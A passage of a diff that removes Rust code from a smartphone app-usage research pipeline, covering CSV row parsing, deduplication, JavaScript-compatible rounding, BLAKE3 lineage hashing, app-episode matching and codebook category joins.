-    pub no_witness_min_day_apps: u32,
-}
-
-const fn default_true() -> bool {
-    true
-}
-
-fn default_timezone_handling() -> String {
-    "selected-convert".into()
-}
-
-fn default_aggregate_shape() -> String {
-    "wide".into()
-}
-
-const fn default_compliance_threshold_percent() -> f64 {
-    70.0
-}
-
-const fn default_credited_session_cap_minutes() -> f64 {
-    360.0
-}
-
-const fn default_device_liveness_gap_tolerance_minutes() -> f64 {
-    120.0
-}
-
-const fn default_auto_lock_bridge_seconds() -> f64 {
-    120.0
-}
-
-const fn default_no_witness_min_day_apps() -> u32 {
-    2
-}
-
-impl PipelineV2OptionsJson {
-    pub fn into_pipeline_options(self) -> PipelineV2Options {
-        let materialize_visualization_data = self
-            .materialize_visualization_data
-            .unwrap_or(self.enable_plotting || self.enable_interactive_timeline);
-        let mode = match self.usage_session_mode.as_str() {
-            "no_usage" => UsageSessionMode::NoUsage,
-            "screen_usage" => UsageSessionMode::ScreenUsage,
-            "app_and_screen_usage" => UsageSessionMode::AppAndScreenUsage,
-            _ => UsageSessionMode::AppUsage,
-        };
-        PipelineV2Options {
-            study_name: self.study_name,
-            timezone: self.timezone,
-            timezone_handling: self.timezone_handling,
-            usage_session_mode: mode,
-            include_app_output: self.include_app_output,
-            include_screen_output: self.include_screen_output,
-            use_filter_file: self.use_filter_file,
-            use_apps_forcing_screen_open: self.use_apps_forcing_screen_open,
-            use_background_apps_file: self.use_background_apps_file,
-            use_app_codebook: self.use_app_codebook,
-            include_category_column: self.include_category_column,
-            deduplicate_exact_rows: self.deduplicate_exact_rows,
-            interaction_type_remap: self.interaction_type_remap,
-            correct_duplicate_event_timestamps: self.correct_duplicate_event_timestamps,
-            allow_stop_event_reuse: self.allow_stop_event_reuse,
-            use_activity_stopped_as_fallback: self.use_activity_stopped_as_fallback,
-            apply_threshold_to_fallback: self.apply_threshold_to_fallback,
-            long_duration_threshold_ns: self.long_duration_threshold_ns,
-            proximity_interval_ns: self.proximity_interval_ns,
-            custom_app_engagement_duration: self.custom_app_engagement_duration,
-            long_data_time_gap_thresholds: self.long_data_time_gap_thresholds,
-            long_usage_duration_thresholds: self.long_usage_duration_thresholds,
-            same_app_stop_types: self.same_app_stop_types,
-            other_stop_types: self.other_stop_types,
-            interaction_types_to_remove: self.interaction_types_to_remove,
-            screen_auto_lock_timeout_seconds: self.screen_auto_lock_timeout_seconds,
-            screen_auto_lock_tolerance_seconds: self.screen_auto_lock_tolerance_seconds,
-            screen_manual_lock_max_tail_seconds: self.screen_manual_lock_max_tail_seconds,
-            screen_keyguard_near_stop_seconds: self.screen_keyguard_near_stop_seconds,
-            datetime_of_preprocessing: self.datetime_of_preprocessing,
-            model_concurrent_usage: self.model_concurrent_usage,
-            minimum_usage_duration: self.minimum_usage_duration,
-            apply_minimum_usage_duration_to_concurrent_subintervals: self
-                .apply_minimum_usage_duration_to_concurrent_subintervals,
-            filter_zero_duration_sessions: self.filter_zero_duration_sessions,
-            add_no_activity_placeholder_days: self.add_no_activity_placeholder_days,
-            enable_study_window_filter: self.enable_study_window_filter,
-            enable_person_attribution: self.enable_person_attribution,
-            enable_day_coverage: self.enable_day_coverage,
-            enable_compliance_scoring: self.enable_compliance_scoring,
-            compliance_threshold_percent: self.compliance_threshold_percent,
-            enable_screen_gated_crediting: self.enable_screen_gated_crediting,
-            enable_aggregates: self.enable_aggregates,
-            aggregate_shape: self.aggregate_shape,
-            materialize_visualization_data,
-            credited_session_cap_minutes: self.credited_session_cap_minutes,
-            device_liveness_gap_tolerance_minutes: self.device_liveness_gap_tolerance_minutes,
-            auto_lock_bridge_seconds: self.auto_lock_bridge_seconds,
-            no_witness_min_day_apps: self.no_witness_min_day_apps,
-        }
-    }
-}
-
-fn normalize_interaction_type_local(s: &str) -> &str {
-    crate::normalize_interaction_type(s)
-}
-
-fn parse_raw_rows(
-    csv_bytes: &[u8],
-    opts: &PipelineV2Options,
-    query_checkpoints: &mut QueryCheckpointRecorder<'_>,
-) -> Result<(Vec<Row>, String), String> {
-    let interaction_remap = incremental::validate_remap_rules(&opts.interaction_type_remap);
-    query_checkpoints.value("validate_remap_rules", &interaction_remap)?;
-    let raw_rows = incremental::decode_source_records(csv_bytes);
-    query_checkpoints.value("decode_source_records", &raw_rows)?;
-
-    let raw_rows = incremental::remove_missing_timestamps(raw_rows);
-    query_checkpoints.value("remove_missing_timestamps", &raw_rows)?;
-
-    let possible_device_model = incremental::attach_device_models(&raw_rows);
-    query_checkpoints.value("attach_device_models", &possible_device_model)?;
-    let preprocessing_datetime =
-        incremental::bind_processing_timestamp(&opts.datetime_of_preprocessing);
-    query_checkpoints.value("bind_processing_timestamp", &preprocessing_datetime)?;
-
-    let rows = incremental::canonicalize_source_rows(
-        &raw_rows,
-        &opts.timezone,
-        &interaction_remap,
-        &possible_device_model,
-    )?;
-    query_checkpoints.rows("canonicalize_source_rows", &rows);
-
-    let rows = incremental::order_source_records(rows);
-    query_checkpoints.rows("order_source_records", &rows);
-    let available_timezones = incremental::collect_timezone_observations(&rows);
-    query_checkpoints.value("collect_timezone_observations", &available_timezones)?;
-
-    Ok((rows, opts.timezone.clone()))
-}
-
-#[derive(Clone, serde::Serialize, serde::Deserialize)]
-struct RawRow {
-    source_data_row: u32,
-    event_timestamp: String,
-    timezone: String,
-    app_package_name: String,
-    interaction_type: String,
-    application_label: String,
-    study_id: String,
-    participant_id: String,
-    username: String,
-}
-
-fn dedupe_exact_rows(rows: Vec<Row>) -> Vec<Row> {
-    let mut seen =
-        AHashMap::<(SharedString, i64, SharedString, SharedString), usize>::with_capacity(
-            rows.len(),
-        );
-    let mut out: Vec<Row> = Vec::with_capacity(rows.len());
-    for row in rows {
-        let key = (
-            row.participant_id.clone(),
-            row.event_timestamp_ns,
-            row.interaction_type.clone(),
-            row.app_package_name.clone(),
-        );
-        if let Some(index) = seen.get(&key).copied() {
-            out[index].source_data_rows.merge(&row.source_data_rows);
-        } else {
-            seen.insert(key, out.len());
-            out.push(row);
-        }
-    }
-    out
-}
-
-fn count_duplicate_groups(rows: &[Row]) -> u32 {
-    if rows.len() <= 1 {
-        return 0;
-    }
-    let mut duplicates = 0u32;
-    let mut run_start = 0;
-    for i in 1..rows.len() {
-        if rows[i].event_timestamp_ns != rows[run_start].event_timestamp_ns {
-            let len = i - run_start;
-            if len > 1 {
-                duplicates += (len - 1) as u32;
-            }
-            run_start = i;
-        }
-    }
-    let len = rows.len() - run_start;
-    if len > 1 {
-        duplicates += (len - 1) as u32;
-    }
-    duplicates
-}
-
-fn duplicate_priority(it: &str, stop_types: &AHashSet<&str>) -> u8 {
-    let normalized = if it == "Screen Non-interactive" {
-        "Screen Non-Interactive"
-    } else {
-        it
-    };
-    if normalized == "Activity Resumed" {
-        return 0;
-    }
-    if stop_types.contains(normalized) {
-        return 2;
-    }
-    1
-}
-
-fn unalign_duplicate_timestamps(
-    mut rows: Vec<Row>,
-    same_app_stop_types: &[String],
-    other_stop_types: &[String],
-) -> Vec<Row> {
-    if rows.len() <= 1 {
-        return rows;
-    }
-    let mut stop_types: AHashSet<&str> = AHashSet::new();
-    for v in same_app_stop_types {
-        stop_types.insert(v.as_str());
-    }
-    for v in other_stop_types {
-        stop_types.insert(v.as_str());
-    }
-    let has_dupes =
-        (1..rows.len()).any(|i| rows[i].event_timestamp_ns <= rows[i - 1].event_timestamp_ns);
-    if !has_dupes {
-        return rows;
-    }
-    let mut start = 0;
-    while start < rows.len() {
-        let mut end = start + 1;
-        while end < rows.len() && rows[end].event_timestamp_ns == rows[start].event_timestamp_ns {
-            end += 1;
-        }
-        let count = end - start;
-        if count > 1 {
-            // sort indices [start..end) by (priority, local_index)
-            let mut order: Vec<(u8, usize)> = (start..end)
-                .enumerate()
-                .map(|(local, abs)| {
-                    (
-                        duplicate_priority(&rows[abs].interaction_type, &stop_types),
-                        local,
-                    )
-                })
-                .collect();
-            order.sort_by(|a, b| a.0.cmp(&b.0).then(a.1.cmp(&b.1)));
-            // Apply offset based on ordered position. Match TS:
-            //   entry.row.event_timestamp_ns -= BigInt(count - orderedIndex) * 1000n
-            // We need to first take ownership then re-place. Use index swap.
-            // Build new ordered slice and write back.
-            let block: Vec<Row> = (start..end).map(|i| rows[i].clone()).collect();
-            for (ordered_index, (_, local)) in order.iter().enumerate() {
-                let mut updated = block[*local].clone();
-                let offset = (count - ordered_index) as i64 * 1_000;
-                updated.edit_temporal().event_timestamp_ns -= offset;
-                rows[start + ordered_index] = updated;
-            }
-        }
-        start = end;
-    }
-    rows.sort_by(|a, b| {
-        a.event_timestamp_ns
-            .cmp(&b.event_timestamp_ns)
-            .then(a.index.cmp(&b.index))
-    });
-    rows
-}
-
-fn derive_time_gap_evidence(mut rows: Vec<Row>) -> Vec<Row> {
-    for i in 0..rows.len() {
-        let final_v = if i == 0 {
-            0.0
-        } else {
-            let delta_ns = rows[i].event_timestamp_ns - rows[i - 1].event_timestamp_ns;
-            // (Number(delta_ns) / 3.6e12).toFixed(2) -> parse back to f64
-            let raw = (delta_ns as f64) / 3_600_000_000_000.0;
-            let rounded = ecma_round_fixed_f64(raw, 2);
-            // JS `(x || 0)` -> 0 if NaN or 0; otherwise rounded.
-            if rounded == 0.0 || rounded.is_nan() {
-                0.0
-            } else {
-                rounded
-            }
-        };
-        // Most gaps round to the 0.0 the row already holds; writing that
-        // back would deep-clone the shared row and invalidate its temporal
-        // checkpoint part for an identical value.
-        if rows[i].data_time_gap_hours != final_v {
-            rows[i].edit_temporal().data_time_gap_hours = final_v;
-        }
-    }
-    rows
-}
-
-/// Numeric result of ECMAScript `Number.prototype.toFixed`, without building
-/// the intermediate decimal string. The binary f64 is decomposed into its
-/// exact integer mantissa and power-of-two denominator, then rounded to the
-/// requested decimal scale with the specification's larger-integer tie rule.
-fn ecma_round_fixed_f64(value: f64, frac_digits: u32) -> f64 {
-    if !value.is_finite() || value == 0.0 || value.abs() >= 1e21 {
-        return value;
-    }
-    let negative = value.is_sign_negative();
-    let bits = value.abs().to_bits();
-    let exponent_bits = ((bits >> 52) & 0x7ff) as i32;
-    let fraction = bits & ((1_u64 << 52) - 1);
-    let (mantissa, exponent) = if exponent_bits == 0 {
-        (fraction, 1 - 1023 - 52)
-    } else {
-        ((1_u64 << 52) | fraction, exponent_bits - 1023 - 52)
-    };
-    let scale = 10_u128.pow(frac_digits);
-    let scaled_mantissa = (mantissa as u128) * scale;
-    let rounded_integer = if exponent >= 0 {
-        scaled_mantissa
-            .checked_shl(exponent as u32)
-            .unwrap_or(u128::MAX)
-    } else {
-        let shift = (-exponent) as u32;
-        if shift >= 128 {
-            0
-        } else {
-            let denominator = 1_u128 << shift;
-            let quotient = scaled_mantissa / denominator;
-            let remainder = scaled_mantissa % denominator;
-            quotient + u128::from(remainder >= denominator / 2)
-        }
-    };
-    let rounded = rounded_integer as f64 / scale as f64;
-    if negative {
-        -rounded
-    } else {
-        rounded
-    }
-}
-
-/// ECMAScript Number.prototype.toFixed(fractionDigits) — string form.
-/// Spec: pick integer n such that |n/10^f - x| is minimised; on ties pick
-/// the larger n. (Round-half-away-from-zero on the exact IEEE 754 value.)
-#[cfg(test)]
-fn ecma_to_fixed(value: f64, frac_digits: u32) -> String {
-    if value.is_nan() {
-        return "NaN".to_string();
-    }
-    if value.is_infinite() {
-        return if value > 0.0 {
-            "Infinity".to_string()
-        } else {
-            "-Infinity".to_string()
-        };
-    }
-    if value >= 1e21 || value <= -1e21 {
-        return js_number_to_string(value);
-    }
-    let neg = value < 0.0;
-    let abs_v = value.abs();
-    // Use Rust's round-half-to-even result as a starting point, then bump to
-    // round-half-away-from-zero where the original value is exactly halfway.
-    // Easier: render with one extra digit, then post-process.
-    let extra = format!("{:.*}", (frac_digits + 1) as usize, abs_v);
-    // extra looks like "21.625" for frac_digits=2.
-    // Truncate the last digit and round if it's >=5; tie at 5 with no further
-    // digits is rounded up. But we actually need to check whether the
-    // *unrounded* value is exactly the boundary. f64 can't represent 21.625
-    // exactly; printing it with f+1 digits in Rust gives the round-half-even
-    // result of that. To match JS, render with much higher precision.
-    // Simpler approach: render with 17 significant digits, scan + round.
-    let high = format!("{:.20}", abs_v);
-    let rounded = round_half_away_from_zero_decimal(&high, frac_digits as usize);
-    let _ = extra;
-    if neg && rounded != "0" && !is_all_zeros(&rounded) {
-        format!("-{rounded}")
-    } else {
-        rounded
-    }
-}
-
-#[cfg(test)]
-fn is_all_zeros(s: &str) -> bool {
-    s.chars().all(|c| c == '0' || c == '.')
-}
-
-/// Round a positive decimal string ("21.62500000000000124...") to `frac_digits`
-/// fractional digits, using round-half-away-from-zero on the *exact* string
-/// value. The string is expected to have plenty of trailing digits.
-#[cfg(test)]
-fn round_half_away_from_zero_decimal(s: &str, frac_digits: usize) -> String {
-    let dot = match s.find('.') {
-        Some(i) => i,
-        None => {
-            // Integer; pad with zeros if frac_digits>0.
-            if frac_digits == 0 {
-                return s.to_string();
-            }
-            return format!("{s}.{}", "0".repeat(frac_digits));
-        }
-    };
-    let int_part = &s[..dot];
-    let frac_part = &s[dot + 1..];
-    if frac_part.len() <= frac_digits {
-        // Pad with zeros.
-        let pad = "0".repeat(frac_digits - frac_part.len());
-        if frac_digits == 0 {
-            return int_part.to_string();
-        }
-        return format!("{int_part}.{frac_part}{pad}");
-    }
-    // Truncate and inspect.
-    let kept = &frac_part[..frac_digits];
-    let tail = &frac_part[frac_digits..];
-    let first_drop = tail.chars().next().unwrap();
-    let round_up = if first_drop > '5' {
-        true
-    } else if first_drop < '5' {
-        false
-    } else {
-        // first_drop == '5': round-half-away-from-zero always rounds up,
-        // whether the remaining digits are zero or non-zero.
-        true
-    };
-    if !round_up {
-        if frac_digits == 0 {
-            return int_part.to_string();
-        }
-        return format!("{int_part}.{kept}");
-    }
-    // Add 1 to the truncated number.
-    let combined = if frac_digits == 0 {
-        int_part.to_string()
-    } else {
-        format!("{int_part}{kept}")
-    };
-    let bumped = increment_decimal_string(&combined);
-    if frac_digits == 0 {
-        return bumped;
-    }
-    let split = bumped.len() - frac_digits;
-    format!("{}.{}", &bumped[..split], &bumped[split..])
-}
-
-fn increment_decimal_string(s: &str) -> String {
-    let bytes = s.as_bytes();
-    let mut out: Vec<u8> = bytes.to_vec();
-    let mut carry = 1u8;
-    for i in (0..out.len()).rev() {
-        if !out[i].is_ascii_digit() {
-            continue;
-        }
-        let d = out[i] - b'0' + carry;
-        if d >= 10 {
-            out[i] = b'0';
-            carry = 1;
-        } else {
-            out[i] = b'0' + d;
-            carry = 0;
-            break;
-        }
-    }
-    let mut result = String::from_utf8(out).unwrap();
-    if carry == 1 {
-        result.insert(0, '1');
-    }
-    result
-}
-
-fn label_filtered_apps(
-    mut rows: Vec<Row>,
-    filter_map: &HashMap<String, AHashSet<String>>,
-) -> Vec<Row> {
-    if filter_map.is_empty() {
-        return rows;
-    }
-    for row in rows.iter_mut() {
-        let labels = match filter_map.get(row.app_package_name.as_str()) {
-            Some(s) => s,
-            None => continue,
-        };
-        if !labels.is_empty() && !labels.contains(row.application_label.as_str()) {
-            continue;
-        }
-        let replacement = match row.interaction_type.as_str() {
-            ACTIVITY_RESUMED => Some(FILTERED_RESUMED),
-            ACTIVITY_PAUSED => Some(FILTERED_PAUSED),
-            ACTIVITY_STOPPED => Some(FILTERED_STOPPED),
-            "Activity Destroyed" => Some("Filtered App Destroyed"),
-            _ => None,
-        };
-        if let Some(replacement) = replacement {
-            row.edit_classification().interaction_type = replacement.into();
-        }
-    }
-    rows
-}
-
-/// Raw BLAKE3 output for a lineage suffix. Persisting 32-byte hashes avoids
-/// storing the 71-byte ASCII form for every event; the protocol spelling is
-/// reconstructed on the stack only when another hash consumes it.
-#[derive(Clone, Copy, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
-struct InlineLineageDigest([u8; 32]);
-
-impl InlineLineageDigest {
-    fn from_hasher(hasher: CheckpointHasher) -> Self {
-        Self(*hasher.finalize().as_bytes())
-    }
-
-    fn encoded(self) -> [u8; 71] {
-        encode_blake3_digest(self.0)
-    }
-}
-
-fn encode_blake3_digest(digest: [u8; 32]) -> [u8; 71] {
-    const HEX: &[u8; 16] = b"0123456789abcdef";
-    let mut encoded = [0_u8; 71];
-    encoded[..7].copy_from_slice(b"blake3:");
-    for (index, byte) in digest.iter().copied().enumerate() {
-        encoded[7 + index * 2] = HEX[(byte >> 4) as usize];
-        encoded[8 + index * 2] = HEX[(byte & 0x0f) as usize];
-    }
-    encoded
-}
-
-fn inline_lineage_search_suffix_digest(
-    row: &Row,
-    event_index: usize,
-    next_digest: Option<&InlineLineageDigest>,
-) -> InlineLineageDigest {
-    let mut hasher = CheckpointHasher::new();
-    checkpoint_digest_field(&mut hasher, b"chronicle-lineage-search-chain/v1");
-    hasher.update(&(event_index as u64).to_le_bytes());
-    checkpoint_digest_field(&mut hasher, row.participant_id.as_bytes());
-    hasher.update(&row.event_timestamp_ns.to_le_bytes());
-    checkpoint_digest_field(&mut hasher, row.interaction_type.as_bytes());
-    checkpoint_digest_field(&mut hasher, row.app_package_name.as_bytes());
-    hasher.update(&(row.source_data_rows.ranges().len() as u64).to_le_bytes());
-    for source_range in row.source_data_rows.ranges() {
-        hasher.update(&source_range.first.to_le_bytes());
-        hasher.update(&source_range.last.to_le_bytes());
-    }
-    match next_digest {
-        Some(digest) => {
-            hasher.update(&[1]);
-            checkpoint_digest_field(&mut hasher, &digest.encoded());
-        }
-        None => {
-            hasher.update(&[0]);
-        }
-    }
-    InlineLineageDigest::from_hasher(hasher)
-}
-
-fn empty_lineage_search_suffix_digest(event_index: u32) -> String {
-    let mut hasher = CheckpointHasher::new();
-    checkpoint_digest_field(&mut hasher, b"chronicle-lineage-search-chain/v1");
-    hasher.update(&event_index.to_le_bytes());
-    hasher.update(&0_u32.to_le_bytes());
-    format!("blake3:{}", hasher.finalize().to_hex())
-}
-
-fn empty_inline_lineage_search_suffix_digest(event_index: u32) -> InlineLineageDigest {
-    let mut hasher = CheckpointHasher::new();
-    checkpoint_digest_field(&mut hasher, b"chronicle-lineage-search-chain/v1");
-    hasher.update(&event_index.to_le_bytes());
-    hasher.update(&0_u32.to_le_bytes());
-    InlineLineageDigest::from_hasher(hasher)
-}
-
-fn inline_lineage_search_suffix_digests(rows: &[Row]) -> Vec<InlineLineageDigest> {
-    let empty_suffix = empty_inline_lineage_search_suffix_digest(rows.len() as u32);
-    let mut suffix_digests = vec![empty_suffix; rows.len() + 1];
-    for index in (0..rows.len()).rev() {
-        suffix_digests[index] = inline_lineage_search_suffix_digest(
-            &rows[index],
-            index,
-            Some(&suffix_digests[index + 1]),
-        );
-    }
-    suffix_digests
-}
-
-fn lineage_search_range_digest(
-    suffix_digests: &[String],
-    start_event_index: u32,
-    end_event_index_exclusive: u32,
-) -> LineageSearchDigest {
-    let mut hasher = CheckpointHasher::new();
-    checkpoint_digest_field(&mut hasher, b"chronicle-lineage-search-range/v1");
-    hasher.update(&start_event_index.to_le_bytes());
-    hasher.update(&end_event_index_exclusive.to_le_bytes());
-    checkpoint_digest_field(
-        &mut hasher,
-        suffix_digests[start_event_index as usize].as_bytes(),
-    );
-    checkpoint_digest_field(
-        &mut hasher,
-        suffix_digests[end_event_index_exclusive as usize].as_bytes(),
-    );
-    LineageSearchDigest::from_hasher(hasher)
-}
-
-fn inline_lineage_search_range_digest(
-    suffix_digests: &[InlineLineageDigest],
-    start_event_index: u32,
-    end_event_index_exclusive: u32,
-) -> LineageSearchDigest {
-    let mut hasher = CheckpointHasher::new();
-    checkpoint_digest_field(&mut hasher, b"chronicle-lineage-search-range/v1");
-    hasher.update(&start_event_index.to_le_bytes());
-    hasher.update(&end_event_index_exclusive.to_le_bytes());
-    checkpoint_digest_field(
-        &mut hasher,
-        &suffix_digests[start_event_index as usize].encoded(),
-    );
-    checkpoint_digest_field(
-        &mut hasher,
-        &suffix_digests[end_event_index_exclusive as usize].encoded(),
-    );
-    LineageSearchDigest::from_hasher(hasher)
-}
-
-#[allow(clippy::too_many_arguments)]
-fn process_usage_rows(
-    rows: Vec<Row>,
-    background_apps: &AHashSet<String>,
-    filtered_packages: &BTreeSet<String>,
-    opts: &PipelineV2Options,
-    query_checkpoints: &mut QueryCheckpointRecorder<'_>,
-) -> Result<Vec<Row>, String> {
-    let matcher_input = incremental::build_app_event_index(
-        &rows,
-        &opts.same_app_stop_types,
-        &opts.other_stop_types,
-        background_apps,
-        opts.model_concurrent_usage,
-    )?;
-    query_checkpoints.value("build_app_event_index", &matcher_input)?;
-    let result = incremental::match_app_episodes(
-        &matcher_input,
-        opts.allow_stop_event_reuse,
-        opts.use_activity_stopped_as_fallback,
-        opts.apply_threshold_to_fallback,
-        opts.long_duration_threshold_ns,
-        opts.proximity_interval_ns,
-    )?;
-    query_checkpoints.value("match_app_episodes", &result)?;
-
-    let next = incremental::materialize_candidate_episodes(rows, &result, filtered_packages);
-    query_checkpoints.rows("materialize_candidate_episodes", &next);
-
-    let out = incremental::classify_episode_durations(
-        next,
-        filtered_packages,
-        opts.minimum_usage_duration,
-    );
-    query_checkpoints.rows("classify_episode_durations", &out);
-
-    let out = incremental::apply_app_inclusion_policy(out, filtered_packages, background_apps);
-    query_checkpoints.rows("apply_app_inclusion_policy", &out);
-
-    let out = incremental::order_app_episodes(out);
-    query_checkpoints.rows("order_app_episodes", &out);
-
-    let out = incremental::segment_concurrent_usage(
-        out,
-        filtered_packages,
-        background_apps,
-        opts.model_concurrent_usage,
-        opts.minimum_usage_duration,
-        opts.apply_minimum_usage_duration_to_concurrent_subintervals,
-    )?;
-    query_checkpoints.rows("segment_concurrent_usage", &out);
-    Ok(out)
-}
-
-fn run_app_usage_algorithm(
-    mut rows: Vec<Row>,
-    opts: &PipelineV2Options,
-    background_apps: &AHashSet<String>,
-    query_checkpoints: &mut QueryCheckpointRecorder<'_>,
-) -> Result<Vec<Row>, String> {
-    let filtered_packages = incremental::resolve_excluded_packages(&rows);
-    query_checkpoints.value("resolve_excluded_packages", &filtered_packages)?;
-    rows = incremental::mask_excluded_app_events(rows);
-    query_checkpoints.rows("mask_excluded_app_events", &rows);
-    let next = process_usage_rows(
-        rows,
-        background_apps,
-        &filtered_packages,
-        opts,
-        query_checkpoints,
-    )?;
-    Ok(next)
-}
-
-fn join_codebook(rows: &mut [Row], enabled: bool, codebook_map: &HashMap<String, CodebookEntry>) {
-    if !enabled {
-        return;
-    }
-    for row in rows.iter_mut() {
-        join_codebook_row(row, codebook_map);
-    }
-}
-
-fn join_codebook_row(row: &mut Row, codebook_map: &HashMap<String, CodebookEntry>) {
-    let fields = codebook_map
-        .get(row.app_package_name.as_str())
-        .map(|entry| entry.fields.clone())
-        .unwrap_or_else(empty_codebook_fields);
-    if row.codebook_fields != fields {
-        row.edit_classification().codebook_fields = fields;
-    }
-}
-
-fn derive_broad_category(rows: &mut [Row], enabled: bool) {
-    if !enabled {
-        return;
-    }
-    let bcm_play_store_broad_idx = codebook_col_index("bcm_play_store_broad_app_category").unwrap();
-    let usc_broad_idx = codebook_col_index("usc_broad_app_category").unwrap();
-    let babyemu_broad_idx = codebook_col_index("babyemu_broad_app_category").unwrap();
-    let bcm_broad_idx = codebook_col_index("bcm_cnrc_heuristic_category").unwrap();
-
-    let indices = [
-        bcm_play_store_broad_idx,
-        usc_broad_idx,
-        babyemu_broad_idx,
-        bcm_broad_idx,
-    ];
-    for row in rows.iter_mut() {
-        derive_broad_category_row(row, indices);
-    }
-}
-
-fn derive_broad_category_row(row: &mut Row, indices: [usize; 4]) {
-    let candidates = [
-        row.codebook_fields[indices[0]].as_deref(),
-        row.codebook_fields[indices[1]].as_deref(),
-        row.codebook_fields[indices[2]].as_deref(),
-        row.codebook_fields[indices[3]].as_deref(),
-        row.broad_app_category.as_deref(),
-    ];
-    let chosen = candidates
-        .iter()
-        .find_map(|candidate| candidate.filter(|value| !value.trim().is_empty()))
-        .map(String::from);
-    let category = Some(chosen.unwrap_or_else(|| "Unknown".to_string()).into());
-    if row.broad_app_category != category {
-        row.edit_classification().broad_app_category = category;
-    }
-}
-
-fn collapse_app_genre(rows: &mut [Row], enabled: bool) {
-    if !enabled {
-        return;
-    }
-    let babyemu_scraped_idx = codebook_col_index("babyemu_genreId_scraped").unwrap();
-    let babyemu_manual_idx = codebook_col_index("babyemu_genreId_manual").unwrap();
-    let bcm_play_store_genre_idx = codebook_col_index("bcm_play_store_genreId").unwrap();
-    let usc_genre_idx = codebook_col_index("usc_genreId").unwrap();
-
-    let indices = [
-        babyemu_scraped_idx,
-        babyemu_manual_idx,
-        bcm_play_store_genre_idx,
-        usc_genre_idx,
-    ];
-    for row in rows.iter_mut() {
-        collapse_app_genre_row(row, indices);
-    }
-}
-
-fn collapse_app_genre_row(row: &mut Row, indices: [usize; 4]) {
-    let genre_values = indices
-        .into_iter()
-        .filter_map(|index| row.codebook_fields[index].as_ref())
-        .filter(|value| !value.trim().is_empty())
-        .cloned()
-        .collect::<Vec<_>>();
-    if genre_values.is_empty() {
-        if row.genre_id_scraped.as_deref() != Some("Unknown") {
-            row.edit_classification().genre_id_scraped = Some("Unknown".into());
-        }
-        return;
-    }
-    let unique = genre_values
-        .iter()
-        .map(String::as_str)
-        .collect::<AHashSet<_>>();
-    if unique.len() == 1 {
-        let genre = SharedString::from(genre_values[0].as_str());
-        if row.genre_id_scraped.as_ref() != Some(&genre) || !row.codebook_genre_fields_cleared {
-            let data = row.edit_classification();
-            data.genre_id_scraped = Some(genre);
-            data.codebook_genre_fields_cleared = true;
-        }
-    } else if row.genre_id_scraped.is_some() || row.codebook_genre_fields_cleared {
-        let data = row.edit_classification();
-        data.genre_id_scraped = None;
-        data.codebook_genre_fields_cleared = false;
-    }
-}
-
-fn apply_codebook_annotations(
-    rows: &mut [Row],
-    enabled: bool,
-    codebook_map: &HashMap<String, CodebookEntry>,
-) {
-    if !enabled {
-        return;
-    }
-    let broad_indices = [
-        codebook_col_index("bcm_play_store_broad_app_category").unwrap(),
-        codebook_col_index("usc_broad_app_category").unwrap(),
-        codebook_col_index("babyemu_broad_app_category").unwrap(),
-        codebook_col_index("bcm_cnrc_heuristic_category").unwrap(),
-    ];
-    let genre_indices = [
-        codebook_col_index("babyemu_genreId_scraped").unwrap(),
-        codebook_col_index("babyemu_genreId_manual").unwrap(),
-        codebook_col_index("bcm_play_store_genreId").unwrap(),
-        codebook_col_index("usc_genreId").unwrap(),
-    ];
-    for row in rows {
-        join_codebook_row(row, codebook_map);
-        derive_broad_category_row(row, broad_indices);
-        collapse_app_genre_row(row, genre_indices);
-    }
-}
-
-fn walk_app_usage_detail_columns_with_pre(
-    rows: &mut [Row],
-    custom_app_engagement_duration: f64,
-    mut before_row: impl FnMut(&mut Row),
-    mut after_row: impl FnMut(&mut Row),
-) {
-    fn metrics(
-        previous: Option<(i64, &SharedString)>,
-        start: i64,
-        package: &SharedString,
-        custom_duration: f64,
-    ) -> (i32, i32, i32, f64) {
-        let Some((previous_stop, previous_package)) = previous else {
-            return (1, 1, 0, 0.0);
-        };
-        let gap_seconds = start.wrapping_sub(previous_stop) as f64 / 1_000_000_000.0;
-        (
-            i32::from(gap_seconds > 30.0),
-            i32::from(gap_seconds > custom_duration),
-            i32::from(package != previous_package),
-            gap_seconds / 3600.0,
-        )
-    }
-
-    let mut previous_any: Option<(i64, SharedString)> = None;
-    let mut previous_valid: Option<(i64, SharedString)> = None;
-    for row in rows {
-        before_row(row);
-        let is_primary = row.usage_layer.as_deref() != Some("secondary");
-        let is_valid = is_primary && row.interaction_type == APP_USAGE;
-        let is_any = is_valid || (is_primary && row.interaction_type == FILTERED_APP_USAGE);
-        if !is_any {
-            after_row(row);
-            continue;
-        }
-        let start = row.start_timestamp_ns.unwrap_or(i64::MIN);
-        let stop = row.stop_timestamp_ns.unwrap_or(i64::MIN);
-        let package = row.app_package_name.clone();
-        let (engage_30, engage_custom, switched, gap_hours) = metrics(
-            previous_any
-                .as_ref()
-                .map(|(previous_stop, previous_package)| (*previous_stop, previous_package)),
-            start,
-            &package,
-            custom_app_engagement_duration,
-        );
-        let valid_metrics = is_valid.then(|| {
-            metrics(
-                previous_valid
-                    .as_ref()
-                    .map(|(previous_stop, previous_package)| (*previous_stop, previous_package)),
-                start,
-                &package,
-                custom_app_engagement_duration,
-            )
-        });
-        let any_classification_changed = row.any_app_new_engage_30s != engage_30
-            || row.any_app_new_engage_custom != engage_custom
-            || row.any_app_switched_app != switched;
-        let any_temporal_changed =
-            row.any_app_usage_time_gap_hours.to_bits() != gap_hours.to_bits();
-        let valid_classification_changed =
-            valid_metrics.is_some_and(|(engage_30, engage_custom, switched, _)| {
-                row.valid_app_new_engage_30s != engage_30
-                    || row.valid_app_new_engage_custom != engage_custom
-                    || row.valid_app_switched_app != switched
-            });
-        let valid_temporal_changed = valid_metrics.is_some_and(|(_, _, _, gap_hours)| {
-            row.valid_app_usage_time_gap_hours.to_bits() != gap_hours.to_bits()
-        });
-        if any_classification_changed
-            || any_temporal_changed
-            || valid_classification_changed
-            || valid_temporal_changed
-        {
-            let data = row.edit_components(
-                false,
-                any_temporal_changed || valid_temporal_changed,
-                any_classification_changed || valid_classification_changed,
-            );
-            data.any_app_new_engage_30s = engage_30;
-            data.any_app_new_engage_custom = engage_custom;
-            data.any_app_switched_app = switched;
-            data.any_app_usage_time_gap_hours = gap_hours;
-            if let Some((engage_30, engage_custom, switched, gap_hours)) = valid_metrics {
-                data.valid_app_new_engage_30s = engage_30;
-                data.valid_app_new_engage_custom = engage_custom;
-                data.valid_app_switched_app = switched;
-                data.valid_app_usage_time_gap_hours = gap_hours;
-            }
-        }
-        previous_any = Some((stop, package.clone()));
-        if is_valid {
-            previous_valid = Some((stop, package));
-        }
-        after_row(row);
-    }
-}
-
-fn walk_app_usage_detail_columns(
